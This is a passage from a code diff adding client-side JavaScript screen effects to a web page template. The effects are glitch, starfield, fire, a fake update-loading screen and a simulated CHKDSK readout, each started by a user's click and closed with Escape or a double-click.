+        const sliceY = Math.random() * H, sliceH = Math.random()*30+5, shift = (Math.random()-0.5)*60;
+        const imgData = ctx.getImageData(0, sliceY, W, sliceH);
+        ctx.putImageData(imgData, shift, sliceY);
+      }
+      if (Math.random() < 0.1){
+        const bx = Math.random()*W, by = Math.random()*H, bw = Math.random()*200+20, bh = Math.random()*20+2;
+        const imgData = ctx.createImageData(bw, bh);
+        for (let i=0;i<imgData.data.length;i+=4){
+          imgData.data[i]=Math.random()*255; imgData.data[i+1]=Math.random()*255;
+          imgData.data[i+2]=Math.random()*255; imgData.data[i+3]=Math.random()*200+55;
+        }
+        ctx.putImageData(imgData, bx, by);
+      }
+      if (frameCount%60 < 30 && Math.random() < 0.3){
+        ctx.font = 'bold '+(40+Math.random()*40)+'px monospace';
+        ctx.fillStyle = Math.random()>0.5?'#ff0066':'#00ffff';
+        ctx.globalAlpha = 0.6+Math.random()*0.4;
+        const tx = W/2 - ctx.measureText(glitchText).width/2 + (Math.random()-0.5)*30;
+        const ty = H/2 + (Math.random()-0.5)*30;
+        ctx.fillText(glitchText, tx, ty);
+        ctx.fillStyle = 'rgba(255,0,0,0.3)'; ctx.fillText(glitchText, tx+(Math.random()-0.5)*8, ty);
+        ctx.fillStyle = 'rgba(0,255,255,0.3)'; ctx.fillText(glitchText, tx-(Math.random()-0.5)*8, ty);
+        ctx.globalAlpha = 1;
+      }
+      ctx.fillStyle = 'rgba(0,0,0,0.03)'; ctx.fillRect(0,0,W,H);
+      animFrames.push(requestAnimationFrame(draw));
+    }
+    ctx.fillStyle = '#000'; ctx.fillRect(0,0,W,H);
+    draw();
+  }
+
+  // ===== 星空穿越 =====
+  function effectStarfield(){
+    overlay.innerHTML = '<div class="se-starfield"><canvas id="se-star-canvas"></canvas></div>';
+    const canvas = document.getElementById('se-star-canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = overlay.clientWidth || window.innerWidth;
+    canvas.height = overlay.clientHeight || window.innerHeight;
+    const W = canvas.width, H = canvas.height, cx = W/2, cy = H/2;
+    const stars = [];
+    const numStars = 600;
+    for (let i = 0; i < numStars; i++){
+      stars.push({ x: (Math.random()-0.5)*W*2, y: (Math.random()-0.5)*H*2, z: Math.random()*W });
+    }
+    const speed = 8;
+    function draw(){
+      ctx.fillStyle = 'rgba(0,0,0,0.2)'; ctx.fillRect(0,0,W,H);
+      for (let i = 0; i < stars.length; i++){
+        const s = stars[i];
+        s.z -= speed;
+        if (s.z <= 0){ s.x = (Math.random()-0.5)*W*2; s.y = (Math.random()-0.5)*H*2; s.z = W; }
+        const sx = (s.x/s.z)*W/2 + cx, sy = (s.y/s.z)*H/2 + cy;
+        const r = Math.max(0.5, (1-s.z/W)*3);
+        if (sx<0||sx>W||sy<0||sy>H) continue;
+        const brightness = 1 - s.z/W;
+        ctx.beginPath(); ctx.arc(sx, sy, r, 0, Math.PI*2);
+        ctx.fillStyle = 'rgba(255,255,255,' + brightness + ')'; ctx.fill();
+        if (brightness > 0.3){
+          const prevZ = s.z + speed;
+          const psx = (s.x/prevZ)*W/2 + cx, psy = (s.y/prevZ)*H/2 + cy;
+          ctx.beginPath(); ctx.moveTo(psx, psy); ctx.lineTo(sx, sy);
+          ctx.strokeStyle = 'rgba(255,255,255,' + (brightness*0.4) + ')';
+          ctx.lineWidth = r*0.5; ctx.stroke();
+        }
+      }
+      animFrames.push(requestAnimationFrame(draw));
+    }
+    draw();
+  }
+
+  // ===== 火焰效果 =====
+  function effectFire(){
+    overlay.innerHTML = '<div class="se-fire"><canvas id="se-fire-canvas"></canvas></div>';
+    const canvas = document.getElementById('se-fire-canvas');
+    const ctx = canvas.getContext('2d');
+    const scale = 4;
+    canvas.width = Math.floor((overlay.clientWidth||window.innerWidth)/scale);
+    canvas.height = Math.floor((overlay.clientHeight||window.innerHeight)/scale);
+    const W = canvas.width, H = canvas.height;
+    const palette = [];
+    for (let i = 0; i < 256; i++){
+      let r, g, b;
+      if (i<64){ r=i*4; g=0; b=0; }
+      else if (i<128){ r=255; g=(i-64)*4; b=0; }
+      else if (i<192){ r=255; g=255; b=(i-128)*4; }
+      else { r=255; g=255; b=255; }
+      palette.push([r,g,b]);
+    }
+    const firePixels = new Uint8Array(W*H);
+    function draw(){
+      for (let x=0; x<W; x++){
+        firePixels[(H-1)*W+x] = Math.random()>0.4 ? Math.floor(Math.random()*160)+96 : 0;
+      }
+      for (let y=0; y<H-1; y++){
+        for (let x=0; x<W; x++){
+          const src = ((y+1)*W) + ((x+Math.floor(Math.random()*3)-1+W)%W);
+          const val = firePixels[src] - Math.floor(Math.random()*3) - 1;
+          firePixels[y*W+x] = val > 0 ? val : 0;
+        }
+      }
+      const img = ctx.createImageData(W, H);
+      for (let i=0; i<firePixels.length; i++){
+        const c = palette[firePixels[i]], idx = i*4;
+        img.data[idx]=c[0]; img.data[idx+1]=c[1]; img.data[idx+2]=c[2]; img.data[idx+3]=255;
+      }
+      ctx.putImageData(img, 0, 0);
+      animFrames.push(requestAnimationFrame(draw));
+    }
+    draw();
+  }
+
+  // ===== 假加载画面 =====
+  function effectLoading(){
+    const items = ['正在准备文件...','正在应用系统设置...','正在配置驱动程序...','正在优化性能...','正在检查更新...','正在安装组件...','正在注册服务...','正在清理临时文件...','正在同步配置...','正在完成设置...'];
+    overlay.innerHTML = '<div class="se-loading"><div class="se-loading-spinner"></div><div class="se-loading-text" id="se-load-text">正在准备...</div><div class="se-loading-sub" id="se-load-sub">这可能需要几分钟</div><div class="se-loading-bar"><div class="se-loading-bar-inner" id="se-load-bar"></div></div><div class="se-loading-detail" id="se-load-detail"></div></div>';
+    let pct = 0;
+    const bar = document.getElementById('se-load-bar'), textEl = document.getElementById('se-load-text'), detailEl = document.getElementById('se-load-detail');
+    let itemIdx = 0;
+    const iv = setInterval(() => {
+      if (pct < 98){ pct += Math.floor(Math.random()*2)+1; if (pct > 98) pct = 98; }
+      if (bar) bar.style.width = pct + '%';
+      if (textEl) textEl.textContent = items[itemIdx % items.length];
+      if (detailEl) detailEl.textContent = '已完成 ' + pct + '%，请勿关闭计算机';
+      if (pct >= 98 && Math.random() < 0.1){ itemIdx++; pct = 96 + Math.floor(Math.random()*2); }
+    }, 600);
+    intervals.push(iv);
+  }
+
+  // ===== 磁盘自检 =====
+  function effectCHKDSK(){
+    overlay.innerHTML = '<div class="se-chkdsk" id="se-chkdsk"></div>';
+    const el = document.getElementById('se-chkdsk');
+    const lines = [
+      {c:'se-chkdsk-title', v:'Checking file system on C:'},
+      {c:'se-chkdsk-info', v:'The type of the file system is NTFS.'},
+      {c:'', v:''},
+      {c:'se-chkdsk-progress', v:'CHKDSK is verifying files (stage 1 of 3)...'},
+      {c:'', v:'  0 percent completed.'},
+      {c:'', v:' 12 percent completed.'},
+      {c:'', v:' 28 percent completed.'},
+      {c:'', v:' 45 percent completed.'},
+      {c:'', v:' 62 percent completed.'},
+      {c:'', v:' 78 percent completed.'},
+      {c:'', v:' 91 percent completed.'},
+      {c:'se-chkdsk-progress', v:'File verification completed.'},
+      {c:'', v:''},
+      {c:'se-chkdsk-progress', v:'CHKDSK is verifying indexes (stage 2 of 3)...'},
+      {c:'', v:' 15 percent completed.'},
+      {c:'', v:' 37 percent completed.'},
+      {c:'', v:' 59 percent completed.'},
+      {c:'', v:' 84 percent completed.'},
+      {c:'se-chkdsk-progress', v:'Index verification completed.'},
+      {c:'', v:''},
+      {c:'se-chkdsk-progress', v:'CHKDSK is verifying security descriptors (stage 3 of 3)...'},
+      {c:'', v:' 33 percent completed.'},
+      {c:'', v:' 66 percent completed.'},
+      {c:'se-chkdsk-progress', v:'Security descriptor verification completed.'},
+      {c:'', v:''},
+      {c:'se-chkdsk-info', v:'  976759807 KB total disk space.'},
+      {c:'se-chkdsk-info', v:'  452198332 KB in 148591 files.'},
+      {c:'se-chkdsk-info', v:'     75648 KB in 34211 indexes.'},
+      {c:'se-chkdsk-error', v:'     12288 KB in bad sectors.'},
+      {c:'se-chkdsk-info', v:'    443300 KB in use by the system.'},
+      {c:'se-chkdsk-info', v:'  524040239 KB available on disk.'},
+      {c:'', v:''},
+      {c:'se-chkdsk-error', v:'Errors found. CHKDSK cannot continue in read-only mode.'}
+    ];
+    let idx = 0;
+    function append(){
+      if (idx >= lines.length) return;
+      const l = lines[idx];
+      const div = document.createElement('div');
+      if (l.c) div.className = l.c;
+      div.textContent = l.v;
+      el.appendChild(div);
+      el.scrollTop = el.scrollHeight;
+      idx++;
+      setTimeout(append, 80 + Math.random() * 160);
+    }
+    append();
+  }
+
+  // 绑定事件
+  document.querySelectorAll('.se-card').forEach(card => {
+    card.addEventListener('click', () => {
+      const effect = card.dataset.effect;
+      if (effect) showEffect(effect);
+    });
+  });
+
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Escape' && currentEffect) exitEffect();
+  });
+
+  // 监听浏览器原生全屏退出（按 ESC 时浏览器自动退出全屏，需要同步清理 overlay）
+  function onFSChange() {
+    if (!document.fullscreenElement && !document.webkitFullscreenElement && currentEffect) {
+      exitEffect();
+    }
+  }
+  document.addEventListener('fullscreenchange', onFSChange);
+  document.addEventListener('webkitfullscreenchange', onFSChange);
+
+  overlay.addEventListener('dblclick', exitEffect);
+})();
+</script>
+{{ end }}
